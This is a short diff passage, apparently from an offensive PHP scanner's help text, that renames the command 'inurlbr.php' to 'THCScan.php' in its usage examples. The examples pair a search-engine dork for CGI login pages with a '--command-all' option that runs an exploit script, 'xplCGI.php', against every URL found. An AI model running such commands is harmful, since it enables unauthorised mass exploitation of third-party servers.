-./inurlbr.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:\"cgi-bin/login.cgi\"' {$_SESSION["c1"]}-s {$_SESSION["c2"]}cgi.txt --ifurl 'cgi' --command-all 'php xplCGI.php _TARGET_' {$_SESSION["c0"]} 
+./THCScan.php {$_SESSION["c1"]}--dork {$_SESSION["c2"]}'inurl:\"cgi-bin/login.cgi\"' {$_SESSION["c1"]}-s {$_SESSION["c2"]}cgi.txt --ifurl 'cgi' --command-all 'php xplCGI.php _TARGET_' {$_SESSION["c0"]} 
  
-./inurlbr.php {$_SESSION["c1"]}--target {$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}4{$_SESSION["c0"]}
+./THCScan.php {$_SESSION["c1"]}--target {$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_urls_find.txt {$_SESSION["c1"]}-s {$_SESSION["c2"]}output.txt {$_SESSION["c1"]}-t {$_SESSION["c2"]}4{$_SESSION["c0"]}
   
-./inurlbr.php {$_SESSION["c1"]}--target {$_SESSION["c2"]}'http
+./THCScan.php {$_SESSION["c1"]}--target {$_SESSION["c2"]}'http://target.com.br' {$_SESSION["c1"]}-o {$_SESSION["c2"]}cancat_file_u
